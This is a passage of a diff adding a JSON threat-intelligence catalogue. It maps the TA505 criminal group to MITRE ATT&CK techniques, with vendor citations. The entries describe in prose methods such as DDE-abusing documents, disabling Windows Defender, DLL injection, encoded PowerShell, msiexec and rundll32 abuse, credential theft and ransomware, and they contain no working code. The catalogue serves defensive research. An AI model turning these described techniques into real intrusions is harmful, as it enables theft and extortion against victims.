+          "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times"
+        },
+        {
+          "citation": "Schwarz, D. and Proofpoint Staff. (2019, January 9). ServHelper and FlawedGrace - New malware introduced by TA505. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Jan 2019",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505"
+        },
+        {
+          "citation": "Salem, E. (2019, April 25). Threat Actor TA505 Targets Financial Enterprises Using LOLBins and a New Backdoor Malware. Retrieved May 28, 2019.",
+          "source_name": "Cybereason TA505 April 2019",
+          "url": "https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware"
+        },
+        {
+          "citation": "Proofpoint Staff. (2018, July 19). TA505 Abusing SettingContent-ms within PDF files to Distribute FlawedAmmyy RAT. Retrieved April 19, 2019.",
+          "source_name": "ProofPoint SettingContent-ms July 2018",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-abusing-settingcontent-ms-within-pdf-files-distribute-flawedammyy-rat"
+        },
+        {
+          "citation": "Proofpoint Staff. (2018, March 7). Leaked Ammyy Admin Source Code Turned into Malware. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Mar 2018",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/leaked-ammyy-admin-source-code-turned-malware"
+        },
+        {
+          "citation": "Hiroaki, H. and Lu, L. (2019, June 12). Shifting Tactics: Breaking Down TA505 Group’s Use of HTML, RATs and Other Techniques in Latest Campaigns. Retrieved May 29, 2020.",
+          "source_name": "Trend Micro TA505 June 2019",
+          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/"
+        },
+        {
+          "citation": "Schwarz, D. et al. (2019, October 16). TA505 Distributes New SDBbot Remote Access Trojan with Get2 Downloader. Retrieved May 29, 2020.",
+          "source_name": "Proofpoint TA505 October 2019",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader"
+        },
+        {
+          "citation": "Frydrych, M. (2020, April 14). TA505 Continues to Infect Networks With SDBbot RAT. Retrieved May 29, 2020.",
+          "source_name": "IBM TA505 April 2020",
+          "url": "https://web.archive.org/web/20200420201624/https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1204.002",
+        "name": "User Execution: Malicious File",
+        "parent_id": "T1204",
+        "url": "https://attack.mitre.org/techniques/T1204/002"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has leveraged malicious Word documents that abused DDE.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--f0e944fa-6dba-47c3-920a-cf7bad2d3bc5",
+        "relationship_modified": "2026-07-31T18:48:05.920Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Proofpoint Staff. (2018, June 8). TA505 shifts with the times. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 June 2018",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1559.002",
+        "name": "Inter-Process Communication: Dynamic Data Exchange",
+        "parent_id": "T1559",
+        "url": "https://attack.mitre.org/techniques/T1559/002"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used malware to disable Windows Defender through modification of the Registry.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--3debe0d7-63bb-4e21-bf9b-ed5e23140e57",
+        "relationship_modified": "2026-07-31T18:48:05.392Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Financial Security Institute. (2020, February 28). Profiling of TA505 Threat Group That Continues to Attack the Financial Sector. Retrieved July 14, 2022.",
+          "source_name": "Korean FSI TA505 2020",
+          "url": "https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory="
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0112",
+          "name": "Defense Impairment",
+          "order": 7,
+          "shortname": "defense-impairment",
+          "url": "https://attack.mitre.org/tactics/TA0112"
+        }
+      ],
+      "technique": {
+        "id": "T1112",
+        "name": "Modify Registry",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1112"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has been seen injecting a DLL into winword.exe.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--f1459bdf-06ae-435a-8506-1e8e444a410b",
+        "relationship_modified": "2026-07-31T18:48:05.940Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Frydrych, M. (2020, April 14). TA505 Continues to Infect Networks With SDBbot RAT. Retrieved May 29, 2020.",
+          "source_name": "IBM TA505 April 2020",
+          "url": "https://web.archive.org/web/20200420201624/https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        },
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1055.001",
+        "name": "Process Injection: Dynamic-link Library Injection",
+        "parent_id": "T1055",
+        "url": "https://attack.mitre.org/techniques/T1055/001"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used UPX to obscure malicious code.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--573f3932-8435-4b4a-b138-d9c955495197",
+        "relationship_modified": "2026-07-31T18:48:05.492Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Frydrych, M. (2020, April 14). TA505 Continues to Infect Networks With SDBbot RAT. Retrieved May 29, 2020.",
+          "source_name": "IBM TA505 April 2020",
+          "url": "https://web.archive.org/web/20200420201624/https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027.002",
+        "name": "Obfuscated Files or Information: Software Packing",
+        "parent_id": "T1027",
+        "url": "https://attack.mitre.org/techniques/T1027/002"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used base64 encoded PowerShell commands.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--a8b86839-9c18-465d-aa02-0f0b0132421b",
+        "relationship_modified": "2026-07-31T18:48:05.703Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Salem, E. (2019, April 25). Threat Actor TA505 Targets Financial Enterprises Using LOLBins and a New Backdoor Malware. Retrieved May 28, 2019.",
+          "source_name": "Cybereason TA505 April 2019",
+          "url": "https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware"
+        },
+        {
+          "citation": "Vilkomir-Preisman, S. (2019, April 2). New ServHelper Variant Employs Excel 4.0 Macro to Drop Signed Payload. Retrieved September 16, 2024..",
+          "source_name": "Deep Instinct TA505 Apr 2019",
+          "url": "https://www.deepinstinct.com/blog/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027.010",
+        "name": "Obfuscated Files or Information: Command Obfuscation",
+        "parent_id": "T1027",
+        "url": "https://attack.mitre.org/techniques/T1027/010"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has password-protected malicious Word documents.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--53e89989-29a6-461f-854c-42eb96b221b3",
+        "relationship_modified": "2026-07-31T18:48:05.473Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Proofpoint Staff. (2017, September 27). Threat Actor Profile: TA505, From Dridex to GlobeImposter. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Sep 2017",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027.013",
+        "name": "Obfuscated Files or Information: Encrypted/Encoded File",
+        "parent_id": "T1027",
+        "url": "https://attack.mitre.org/techniques/T1027/013"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has decrypted packed DLLs with an XOR key.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--8bba06f3-fac2-4484-a177-53d5716f80a6",
+        "relationship_modified": "2026-07-31T18:48:05.668Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Terefos, A. (2020, November 18). TA505: A Brief History of Their Time. Retrieved July 14, 2022.",
+          "source_name": "NCC Group TA505",
+          "url": "https://research.nccgroup.com/2020/11/18/ta505-a-brief-history-of-their-time/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1140",
+        "name": "Deobfuscate/Decode Files or Information",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1140"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used <code>msiexec</code> to download and execute malicious Windows Installer files.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--2f350d97-8492-4eb4-8640-2c3ae2bc8df1",
+        "relationship_modified": "2026-07-31T18:48:05.364Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Salem, E. (2019, April 25). Threat Actor TA505 Targets Financial Enterprises Using LOLBins and a New Backdoor Malware. Retrieved May 28, 2019.",
+          "source_name": "Cybereason TA505 April 2019",
+          "url": "https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware"
+        },
+        {
+          "citation": "Vilkomir-Preisman, S. (2019, April 2). New ServHelper Variant Employs Excel 4.0 Macro to Drop Signed Payload. Retrieved September 16, 2024..",
+          "source_name": "Deep Instinct TA505 Apr 2019",
+          "url": "https://www.deepinstinct.com/blog/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload"
+        },
+        {
+          "citation": "Hiroaki, H. and Lu, L. (2019, June 12). Shifting Tactics: Breaking Down TA505 Group’s Use of HTML, RATs and Other Techniques in Latest Campaigns. Retrieved May 29, 2020.",
+          "source_name": "Trend Micro TA505 June 2019",
+          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1218.007",
+        "name": "System Binary Proxy Execution: Msiexec",
+        "parent_id": "T1218",
+        "url": "https://attack.mitre.org/techniques/T1218/007"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has leveraged <code>rundll32.exe</code> to execute malicious DLLs.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--841acdc1-42c3-4f7d-9840-c9e4057bc2ab",
+        "relationship_modified": "2026-07-31T18:48:05.651Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Salem, E. (2019, April 25). Threat Actor TA505 Targets Financial Enterprises Using LOLBins and a New Backdoor Malware. Retrieved May 28, 2019.",
+          "source_name": "Cybereason TA505 April 2019",
+          "url": "https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware"
+        },
+        {
+          "citation": "Vilkomir-Preisman, S. (2019, April 2). New ServHelper Variant Employs Excel 4.0 Macro to Drop Signed Payload. Retrieved September 16, 2024..",
+          "source_name": "Deep Instinct TA505 Apr 2019",
+          "url": "https://www.deepinstinct.com/blog/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1218.011",
+        "name": "System Binary Proxy Execution: Rundll32",
+        "parent_id": "T1218",
+        "url": "https://attack.mitre.org/techniques/T1218/011"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has signed payloads with code signing certificates from Thawte and Sectigo.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--badc4d79-2f59-4b9b-9044-9c53dcd386c0",
+        "relationship_modified": "2026-07-31T18:48:05.780Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Salem, E. (2019, April 25). Threat Actor TA505 Targets Financial Enterprises Using LOLBins and a New Backdoor Malware. Retrieved May 28, 2019.",
+          "source_name": "Cybereason TA505 April 2019",
+          "url": "https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware"
+        },
+        {
+          "citation": "Vilkomir-Preisman, S. (2019, April 2). New ServHelper Variant Employs Excel 4.0 Macro to Drop Signed Payload. Retrieved September 16, 2024..",
+          "source_name": "Deep Instinct TA505 Apr 2019",
+          "url": "https://www.deepinstinct.com/blog/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload"
+        },
+        {
+          "citation": "Hiroaki, H. and Lu, L. (2019, June 12). Shifting Tactics: Breaking Down TA505 Group’s Use of HTML, RATs and Other Techniques in Latest Campaigns. Retrieved May 29, 2020.",
+          "source_name": "Trend Micro TA505 June 2019",
+          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0112",
+          "name": "Defense Impairment",
+          "order": 7,
+          "shortname": "defense-impairment",
+          "url": "https://attack.mitre.org/tactics/TA0112"
+        }
+      ],
+      "technique": {
+        "id": "T1553.002",
+        "name": "Subvert Trust Controls: Code Signing",
+        "parent_id": "T1553",
+        "url": "https://attack.mitre.org/techniques/T1553/002"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used.iso files to deploy malicious.lnk files.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--246e66e1-ddd2-4e51-b54c-1579f6ea1626",
+        "relationship_modified": "2026-07-31T18:48:05.345Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Trend Micro. (2019, August 27). TA505: Variety in Use of ServHelper and FlawedAmmyy. Retrieved February 22, 2021.",
+          "source_name": "TrendMicro TA505 Aug 2019",
+          "url": "https://www.trendmicro.com/en_us/research/19/h/ta505-at-it-again-variety-is-the-spice-of-servhelper-and-flawedammyy.html"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0112",
+          "name": "Defense Impairment",
+          "order": 7,
+          "shortname": "defense-impairment",
+          "url": "https://attack.mitre.org/tactics/TA0112"
+        }
+      ],
+      "technique": {
+        "id": "T1553.005",
+        "name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
+        "parent_id": "T1553",
+        "url": "https://attack.mitre.org/techniques/T1553/005"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used malware to disable Windows Defender.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--eac7af33-0dd4-48aa-a78b-8c422ea3e482",
+        "relationship_modified": "2026-07-31T18:48:05.904Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Financial Security Institute. (2020, February 28). Profiling of TA505 Threat Group That Continues to Attack the Financial Sector. Retrieved July 14, 2022.",
+          "source_name": "Korean FSI TA505 2020",
+          "url": "https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory="
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0112",
+          "name": "Defense Impairment",
+          "order": 7,
+          "shortname": "defense-impairment",
+          "url": "https://attack.mitre.org/tactics/TA0112"
+        }
+      ],
+      "technique": {
+        "id": "T1685",
+        "name": "Disable or Modify Tools",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1685"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used malware to gather credentials from FTP clients and Outlook.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--580103be-ffce-4677-b24a-7092c1221ed0",
+        "relationship_modified": "2026-07-31T18:48:05.507Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Proofpoint Staff. (2017, September 27). Threat Actor Profile: TA505, From Dridex to GlobeImposter. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Sep 2017",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1552.001",
+        "name": "Unsecured Credentials: Credentials In Files",
+        "parent_id": "T1552",
+        "url": "https://attack.mitre.org/techniques/T1552/001"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used malware to gather credentials from Internet Explorer.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--9e27c930-eba5-467f-90e5-4ec5b4219735",
+        "relationship_modified": "2026-07-31T18:48:05.692Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Proofpoint Staff. (2017, September 27). Threat Actor Profile: TA505, From Dridex to GlobeImposter. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Sep 2017",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "order": 8,
+          "shortname": "credential-access",
+          "url": "https://attack.mitre.org/tactics/TA0006"
+        }
+      ],
+      "technique": {
+        "id": "T1555.003",
+        "name": "Credentials from Password Stores: Credentials from Web Browsers",
+        "parent_id": "T1555",
+        "url": "https://attack.mitre.org/techniques/T1555/003"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used TinyMet to enumerate members of privileged groups. TA505 has also run <code>net group /domain</code>.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--a9a39a39-b339-41d9-9790-198ac9352bfd",
+        "relationship_modified": "2026-07-31T18:48:05.717Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Frydrych, M. (2020, April 14). TA505 Continues to Infect Networks With SDBbot RAT. Retrieved May 29, 2020.",
+          "source_name": "IBM TA505 April 2020",
+          "url": "https://web.archive.org/web/20200420201624/https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/"
+        },
+        {
+          "citation": "Hiroaki, H. and Lu, L. (2019, June 12). Shifting Tactics: Breaking Down TA505 Group’s Use of HTML, RATs and Other Techniques in Latest Campaigns. Retrieved May 29, 2020.",
+          "source_name": "Trend Micro TA505 June 2019",
+          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1069",
+        "name": "Permission Groups Discovery",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1069"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used the tool EmailStealer to steal and send lists of e-mail addresses to a remote server.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--02c88228-8275-42a7-9c3a-d5393556bceb",
+        "relationship_modified": "2026-08-04T20:30:54.657Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Hiroaki, H. and Lu, L. (2019, June 12). Shifting Tactics: Breaking Down TA505 Group’s Use of HTML, RATs and Other Techniques in Latest Campaigns. Retrieved May 29, 2020.",
+          "source_name": "Trend Micro TA505 June 2019",
+          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0007",
+          "name": "Discovery",
+          "order": 9,
+          "shortname": "discovery",
+          "url": "https://attack.mitre.org/tactics/TA0007"
+        }
+      ],
+      "technique": {
+        "id": "T1087.003",
+        "name": "Account Discovery: Email Account",
+        "parent_id": "T1087",
+        "url": "https://attack.mitre.org/techniques/T1087/003"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used HTTP to communicate with C2 nodes.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--f8e25c1f-84bd-4ddd-bf18-51543d5cff94",
+        "relationship_modified": "2026-09-03T19:47:04.528Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Frydrych, M. (2020, April 14). TA505 Continues to Infect Networks With SDBbot RAT. Retrieved May 29, 2020.",
+          "source_name": "IBM TA505 April 2020",
+          "url": "https://web.archive.org/web/20200420201624/https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols",
+        "parent_id": "T1071",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has downloaded additional malware to execute on victim systems.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--b3436a7d-81cf-4f79-9c74-e3b2370288d2",
+        "relationship_modified": "2026-09-03T19:47:04.579Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Salem, E. (2019, April 25). Threat Actor TA505 Targets Financial Enterprises Using LOLBins and a New Backdoor Malware. Retrieved May 28, 2019.",
+          "source_name": "Cybereason TA505 April 2019",
+          "url": "https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware"
+        },
+        {
+          "citation": "Vilkomir-Preisman, S. (2019, April 2). New ServHelper Variant Employs Excel 4.0 Macro to Drop Signed Payload. Retrieved September 16, 2024..",
+          "source_name": "Deep Instinct TA505 Apr 2019",
+          "url": "https://www.deepinstinct.com/blog/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload"
+        },
+        {
+          "citation": "Proofpoint Staff. (2018, July 19). TA505 Abusing SettingContent-ms within PDF files to Distribute FlawedAmmyy RAT. Retrieved April 19, 2019.",
+          "source_name": "ProofPoint SettingContent-ms July 2018",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/ta505-abusing-settingcontent-ms-within-pdf-files-distribute-flawedammyy-rat"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1105"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used fast flux to mask botnets by distributing payloads across multiple IPs.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--53356453-2cf1-46d9-ac8f-77fc3a2274d9",
+        "relationship_modified": "2026-07-31T18:48:05.458Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Hiroaki, H. and Lu, L. (2019, June 12). Shifting Tactics: Breaking Down TA505 Group’s Use of HTML, RATs and Other Techniques in Latest Campaigns. Retrieved May 29, 2020.",
+          "source_name": "Trend Micro TA505 June 2019",
+          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1568.001",
+        "name": "Dynamic Resolution: Fast Flux DNS",
+        "parent_id": "T1568",
+        "url": "https://attack.mitre.org/techniques/T1568/001"
+      }
+    },
+    {
+      "attack_ref": "G0092",
+      "confidence": "high",
+      "description": "TA505 has used a wide variety of ransomware, such as Clop, Locky, Jaff, Bart, Philadelphia, and GlobeImposter, to encrypt victim files and demand a ransom payment.",
+      "provenance": {
+        "article_source": null,
+        "article_url": null,
+        "attack_version": "20.1",
+        "method": null,
+        "relationship_id": "relationship--c99ee3c6-7d62-4514-bdac-4bf899ea0c16",
+        "relationship_modified": "2026-07-31T18:48:05.817Z",
+        "reviewed_at": null,
+        "source": "mitre-attack",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": "Proofpoint Staff. (2017, September 27). Threat Actor Profile: TA505, From Dridex to GlobeImposter. Retrieved May 28, 2019.",
+          "source_name": "Proofpoint TA505 Sep 2017",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
